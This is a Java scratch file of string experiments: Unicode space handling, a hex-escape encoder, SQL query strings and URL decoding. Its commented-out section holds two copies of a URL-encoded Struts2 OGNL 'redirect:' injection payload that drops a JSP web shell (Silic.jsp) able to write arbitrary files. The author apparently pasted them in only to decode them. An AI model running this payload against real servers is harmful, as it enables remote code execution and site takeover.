package com.roytrack.string;

import java.net.URLDecoder;


public class SeeString {
	
/**
 * @param args
 */
public static void main(String[] args) {
	String aa="";
	
	
	/*String tmpstr="22222222";
	System.out.println(tmpstr.substring(5));
	
	StringBuffer sb=new StringBuffer();
	sb.append("");
	System.out.println(sb.length());
	
	System.out.println("\u9519\u8BEF: \u9875\u9762\u6587\u6863\u7C7B\u578B(DOCTYPE)\u672A\u58F0\u660E");
	
	String chnSpace=" ";
	String engSpace=" ";
	System.out.println(encode(chnSpace));
	System.out.println(encode(engSpace));
	
	StringToHex sth=new StringToHex();
	System.out.println(sth.str2HexStr(chnSpace));
	System.out.println("\u0020");//标准英文空格 ascii
	System.out.println("\u3000");//中文全角空格
	System.out.println("\u00A0");//类似于英文的半角空格  nbsp  non-breaking space
	StringBuffer strBuf=new StringBuffer();
	strBuf.append("SELECT SECURITY_AUTHORITY.ID AS MENUID, SECURITY_AUTHORITY.NAME AS NAME, ");
	strBuf.append("SECURITY_AUTHORITY.ICON AS ICON, SECURITY_AUTHORITY.ORDERS AS ORDERS, ");
	strBuf.append("SECURITY_AUTHORITY.LEVELNO AS LEVELNO, SECURITY_AUTHORITY.PARENTID AS PARENTID, ");
	strBuf.append("SECURITY_AUTHORITY.ISLEAF AS ISLEAF, SECURITY_RESOURCE.ENTRYADDRESS AS URL ");
	strBuf.append("FROM SECURITY_AUTHORITY LEFT JOIN SECURITY_AUTHORITY_RESOURCE ON ");
	strBuf.append("SECURITY_AUTHORITY.ID = SECURITY_AUTHORITY_RESOURCE.AUTHORITYID ");
	strBuf.append("LEFT JOIN SECURITY_RESOURCE ON ");
	strBuf.append("SECURITY_AUTHORITY_RESOURCE.RESOURCEID = SECURITY_RESOURCE.ID ");
	strBuf.append("WHERE (SECURITY_AUTHORITY.ENABLED = 1) AND SECURITY_AUTHORITY_RESOURCE.ISPRIMARY = 1 ");
	strBuf.append("ORDER BY SECURITY_AUTHORITY.PATH, SECURITY_AUTHORITY.ORDERS DESC ");
	System.out.println(strBuf);
	
	String aaa= "SELECT SECURITY_AUTHORITY.ID, SECURITY_RESOURCE.ADDRESS "
		+ "FROM SECURITY_AUTHORITY, SECURITY_AUTHORITY_RESOURCE, SECURITY_RESOURCE "
		+ "WHERE SECURITY_AUTHORITY.ID = SECURITY_AUTHORITY_RESOURCE.AUTHORITYID "
		+ "AND SECURITY_AUTHORITY_RESOURCE.RESOURCEID = SECURITY_RESOURCE.ID "
		+ "AND (SECURITY_RESOURCE.TYPE = 'http') "
		+ "ORDER BY SECURITY_AUTHORITY.LEVELNO DESC, SECURITY_RESOURCE.PRIORITY DESC";
	System.out.println(aaa);*/
	
//	
//	String aaa="?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22Silic.jsp%22).replaceAll('\\\\','%20'),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3C%25%40+page+language%3D%22java%22+pageEncoding%3D%22gbk%22%25%3E%3Cjsp%3Adirective%2Epage+import%3D%22java%2Eio%2EFile%22%2F%3E%3Cjsp%3Adirective%2Epage+import%3D%22java%2Eio%2EOutputStream%22%2F%3E%3Cjsp%3Adirective%2Epage+import%3D%22java%2Eio%2EFileOutputStream%22%2F%3E%3C%25+int+i%3D0%3BString+method%3Drequest%2EgetParameter%28%22act%22%29%3Bif%28method%21%3Dnull%26%26method%2Eequals%28%22yoco%22%29%29%7BString+url%3Drequest%2EgetParameter%28%22url%22%29%3BString+text%3Drequest%2EgetParameter%28%22smart%22%29%3BFile+f%3Dnew+File%28url%29%3Bif%28f%2Eexists%28%29%29%7Bf%2Edelete%28%29%3B%7Dtry%7BOutputStream+o%3Dnew+FileOutputStream%28f%29%3Bo%2Ewrite%28text%2EgetBytes%28%29%29%3Bo%2Eclose%28%29%3B%7Dcatch%28Exception+e%29%7Bi%2B%2B%3B%25%3E0%3C%25%7D%7Dif%28i%3D%3D0%29%7B%25%3E1%3C%25%7D%25%3E%3Cform+action%3D%27%3Fact%3Dyoco%27+method%3D%27post%27%3E%3Cinput+size%3D%22100%22+value%3D%22%3C%25%3Dapplication%2EgetRealPath%28%22%2F%22%29+%25%3E%22+name%3D%22url%22%3E%3Cbr%3E%3Ctextarea+rows%3D%2220%22+cols%3D%2280%22+name%3D%22smart%22%3E 0";
//	System.out.println(URLDecoder.decode(aaa));
//	String bbb="?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22Silic.jsp%22).replaceAll('\\\\','%20'),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3C%25%40+page+language%3D%22java%22+pageEncoding%3D%22gbk%22%25%3E%3Cjsp%3Adirective%2Epage+import%3D%22java%2Eio%2EFile%22%2F%3E%3Cjsp%3Adirective%2Epage+import%3D%22java%2Eio%2EOutputStream%22%2F%3E%3Cjsp%3Adirective%2Epage+import%3D%22java%2Eio%2EFileOutputStream%22%2F%3E%3C%25+int+i%3D0%3BString+method%3Drequest%2EgetParameter%28%22act%22%29%3Bif%28method%21%3Dnull%26%26method%2Eequals%28%22yoco%22%29%29%7BString+url%3Drequest%2EgetParameter%28%22url%22%29%3BString+text%3Drequest%2EgetParameter%28%22smart%22%29%3BFile+f%3Dnew+File%28url%29%3Bif%28f%2Eexists%28%29%29%7Bf%2Edelete%28%29%3B%7Dtry%7BOutputStream+o%3Dnew+FileOutputStream%28f%29%3Bo%2Ewrite%28text%2EgetBytes%28%29%29%3Bo%2Eclose%28%29%3B%7Dcatch%28Exception+e%29%7Bi%2B%2B%3B%25%3E0%3C%25%7D%7Dif%28i%3D%3D0%29%7B%25%3E1%3C%25%7D%25%3E%3Cform+action%3D%27%3Fact%3Dyoco%27+method%3D%27post%27%3E%3Cinput+size%3D%22100%22+value%3D%22%3C%25%3Dapplication%2EgetRealPath%28%22%2F%22%29+%25%3E%22+name%3D%22url%22%3E%3Cbr%3E%3Ctextarea+rows%3D%2220%22+cols%3D%2280%22+name%3D%22smart%22%3E 16";
//	System.out.println(URLDecoder.decode(bbb));
//	aa="%E8%BD%AF%E4%BB%B6%E7%99%BE%E5%AE%B6%E4%B8%9A%E5%8A%A1%E6%94%B6%E5%85%A5%E6%9C%88%E6%8A%A5%E6%A8%A1%E6%9D%BF.xls";
//	System.out.println(URLDecoder.decode(aa));
//	aa="%E9%87%91%E9%B3%9E%E5%B2%82%E6%98%AF%E6%B1%A0%E4%B8%AD%E7%89%A9026";
//	System.out.println(URLDecoder.decode(aa));
	StringBuffer strBuf=new StringBuffer();
	strBuf.append("SELECT SECURITY_AUTHORITY.ID AS MENUID, SECURITY_AUTHORITY.NAME AS NAME, ");
	strBuf.append("SECURITY_AUTHORITY.ICON AS ICON, SECURITY_AUTHORITY.ORDERS AS ORDERS, ");
	strBuf.append("SECURITY_AUTHORITY.LEVELNO AS LEVELNO, SECURITY_AUTHORITY.PARENTID AS PARENTID, ");
	strBuf.append("SECURITY_AUTHORITY.ISLEAF AS ISLEAF, SECURITY_RESOURCE.ENTRYADDRESS AS URL ");
	strBuf.append("FROM SECURITY_AUTHORITY LEFT JOIN SECURITY_AUTHORITY_RESOURCE ON ");
	strBuf.append("SECURITY_AUTHORITY.ID = SECURITY_AUTHORITY_RESOURCE.AUTHORITYID ");
	strBuf.append("LEFT JOIN SECURITY_RESOURCE ON ");
	strBuf.append("SECURITY_AUTHORITY_RESOURCE.RESOURCEID = SECURITY_RESOURCE.ID ");
	strBuf.append("WHERE (SECURITY_AUTHORITY.ENABLED = 1) AND SECURITY_AUTHORITY_RESOURCE.ISPRIMARY = 1 ");
	strBuf.append("ORDER BY SECURITY_AUTHORITY.PATH, SECURITY_AUTHORITY.ORDERS DESC ");
	System.out.println(strBuf);
}

public static String encode(String s) {
    StringBuilder sb = new StringBuilder(s.length() * 3);
    for (char c : s.toCharArray()) {
        if (c < 256) {
            sb.append(c);
        } else {
            sb.append("\\u");
            sb.append(Character.forDigit((c >>> 12) & 0xf, 16));
            sb.append(Character.forDigit((c >>> 8) & 0xf, 16));
            sb.append(Character.forDigit((c >>> 4) & 0xf, 16));
            sb.append(Character.forDigit((c) & 0xf, 16));
        }
    }
    return sb.toString();
}

}
